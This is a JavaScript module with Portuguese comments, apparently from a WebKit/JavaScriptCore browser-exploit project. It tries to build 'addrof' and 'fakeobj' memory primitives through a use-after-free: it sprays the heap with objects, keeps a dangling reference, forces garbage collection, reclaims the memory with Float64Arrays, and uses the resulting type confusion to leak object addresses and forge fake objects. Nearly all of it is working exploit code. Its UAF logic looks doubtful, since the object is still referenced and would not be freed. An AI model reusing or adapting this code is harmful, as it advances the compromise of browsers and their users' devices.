// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R56 - Primitives)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Foco na criação das primitivas `addrof` e `fakeobj` usando a técnica UAF mais
// robusta do R56 para obter um ponto de partida estável para a exploração.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "UAF_Primitives_Test_R56";

// =======================================================================================
// FUNÇÃO ORQUESTRADORA DE TESTE (R56 - Foco em Primitivas)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste de Primitivas UAF ---`, "test");
    
    let final_result = { success: false, message: "Criação de primitivas falhou." };

    try {
        // --- FASE 1: Construir Primitivas `addrof` e `fakeobj` via UAF ---
        logS3("--- FASE 1: Forjando `addrof` e `fakeobj` via UAF ---", "subtest");
        const primitives = createUAFPrimitives();
        if (!primitives || !primitives.addrof || !primitives.fakeobj) {
            throw new Error("Não foi possível estabilizar as primitivas via UAF.");
        }
        logS3("    Primitivas `addrof` e `fakeobj` ESTÁVEIS construídas com sucesso!", "vuln");

        // --- FASE 2: Validar a primitiva `addrof` ---
        logS3("--- FASE 2: Validando a primitiva `addrof` ---", "subtest");
        const test_object = { marker: 0x41424344 };
        const object_address = primitives.addrof(test_object);

        if (isAdvancedInt64Object(object_address) && !object_address.isZero()) {
            logS3(`    SUCESSO! Endereço do objeto de teste vazado: ${object_address.toString(true)}`, "leak");
            final_result = {
                success: true,
                message: "Primitiva `addrof` funcional criada com sucesso!",
                leaked_addr: object_address.toString(true)
            };
        } else {
            throw new Error("A primitiva `addrof` retornou um valor inválido ou nulo.");
        }

    } catch (e) {
        final_result.message = `Exceção na cadeia de teste de primitivas: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}


// --- Funções Primitivas UAF (o coração do exploit) ---
// Extraído de UltimateExploit.mjs
function createUAFPrimitives() {
    // 1. Prepara o palco com um spray massivo para estressar o alocador
    let spray = [];
    for (let i = 0; i < 4096; i++) {
        spray.push({p0: 0, p1: 0, p2: 0, p3: 0, p4: 0, p5: 0, p6: 0, p7: 0});
    }

    // 2. Cria o ponteiro pendurado (dangling pointer)
    let dangling_ref = spray[spray.length - 1];
    spray = null; // Remove a referência principal, tornando TODOS os objetos elegíveis para GC

    // 3. Força a Coleta de Lixo para liberar a memória
    triggerGC();
    
    // 4. Spray de Reclamação com um tipo de objeto diferente
    let float_reclaimers = [];
    for (let i = 0; i < 2048; i++) {
        float_reclaimers.push(new Float64Array(8));
    }

    // 5. Encontra e confirma a referência corrompida
    if (typeof dangling_ref.p0 === 'number' && dangling_ref.p0 !== 0) {
        // A propriedade p0, que era 0, agora tem um valor de ponteiro (double). A confusão de tipos ocorreu.
        logS3("    UAF bem-sucedido! A confusão de tipos foi estabelecida.", "good");
    } else {
        throw new Error("A colisão de memória para o UAF não ocorreu nesta tentativa.");
    }
    
    // Define as primitivas com base na referência corrompida
    const addrof = (obj) => {
        dangling_ref.p1 = obj; // Coloca o objeto a ser vazado em uma propriedade
        const addr_double = dangling_ref.p0; // Lê outra propriedade que agora contém o endereço como double
        
        const buf = new ArrayBuffer(8);
        (new Float64Array(buf))[0] = addr_double;
        const int_view = new Uint32Array(buf);
        return new AdvancedInt64(int_view[0], int_view[1]);
    };

    const fakeobj = (addr) => {
        dangling_ref.p0 = addr.asDouble(); // Escreve um endereço (como double) em uma propriedade
        return dangling_ref.p1; // Retorna a outra propriedade, que agora é um objeto falso no endereço especificado
    };

    return { addrof, fakeobj };
}

function triggerGC() {
    try {
        const arr = [];
        for (let i = 0; i < 2000; i++) {
            arr.push(new ArrayBuffer(1024 * 64)); // Aloca e libera ~128MB
        }
    } catch(e) {}
}
